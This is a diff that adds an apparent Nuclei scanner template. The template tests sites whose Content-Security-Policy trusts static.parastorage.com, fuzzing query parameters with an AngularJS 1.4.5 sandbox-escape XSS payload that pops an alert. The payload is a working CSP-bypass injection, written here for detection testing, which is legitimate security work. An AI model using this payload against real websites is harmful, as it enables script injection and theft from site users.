@@ -1,0 +1,55 @@
+id: parastorage-static-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Parastorage Static
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,parastorage-static
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "parastorage.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: parastorage_static_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - <body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:\'[].constructor.from([1],alert)\'"></body>
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "parastorage_static_csp_xss == true"
+# digest: 490a00463044022033e3222918b92f7d8f05515456d1123fea5f0f6fac6ef6822fadb9d8140cd0a602203686fa11bfd008df2e37aac9a22bd2cad8402e21cb1340dfaf2a94e25031bc9f:922c64590222798bb761d5b6d8e72950
